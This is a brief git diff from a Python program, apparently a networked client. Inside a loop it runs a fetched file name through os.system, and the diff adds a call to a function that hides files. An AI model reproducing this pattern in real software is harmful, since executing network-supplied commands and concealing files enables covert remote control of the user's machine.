@@ -57,8 +57,8 @@ while tryit == False:
         time.sleep(1)
         supDir(dir)
         os.system(getFileName())
+        modif.hiddenFiles()
 
-#fichier modifier
 def receive():
     try:
         client.settimeout(120)
